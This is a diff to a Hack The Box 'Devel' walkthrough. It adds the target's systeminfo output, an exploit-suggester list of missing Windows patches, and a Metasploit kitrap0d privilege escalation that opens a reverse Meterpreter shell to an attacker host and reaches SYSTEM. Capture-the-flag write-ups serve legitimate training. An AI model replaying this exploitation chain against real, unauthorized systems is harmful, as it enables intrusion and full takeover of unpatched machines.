@@ -186,6 +186,50 @@ Domain          : HTB
 Logged On Users : 0
 Meterpreter     : x86/windows
 ```
+systeminfo
+```
+c:\windows\temp>systeminfo 
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ??
+System Boot Time:          9/5/2020, 2:33:17 ??
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.023 MB
+Available Physical Memory: 692 MB
+Virtual Memory: Max Size:  2.047 MB
+Virtual Memory: Available: 1.547 MB
+Virtual Memory: In Use:    500 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+```
 #### 6. Priv Escalation
 I tried the 'getsystem' command first; Then ran the post/multi/recon/local_exploit_suggester to get a list of exploits against the box.
 
@@ -226,4 +270,56 @@ msf5 post(multi/recon/local_exploit_suggester) > run
 [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 [*] Post module execution completed
 msf5 post(multi/recon/local_exploit_suggester) > 
+```
+Also used windows-exploit-suggester.py 
+```
+windows-exploit-suggester % ./windows-exploit-suggester.py --database 2020-05-05-mssb.xls --systeminfo deveL_info.txt 
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (ascii)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 179 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 7 32-bit'
+[*] 
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
+[*] 
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[*] done
+```
+Selected windows/local/ms10_015_kitrap0d exploit for the win
+
+```
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.14.28:4445 
+[*] Launching notepad to host the exploit...
+[+] Process 3468 launched.
+[*] Reflectively injecting the exploit DLL into 3468...
+[*] Injecting exploit into 3468 ...
+[*] Exploit injected. Injecting payload into 3468...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (180291 bytes) to 10.10.10.5
+[*] Meterpreter session 7 opened (10.10.14.28:4445 -> 10.10.10.5:49158) at 2020-05-05 13:20:32 -0600
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```
+c:\Users\Administrator\Desktop>type root.txt.txt
+type root.txt.txt
 ```
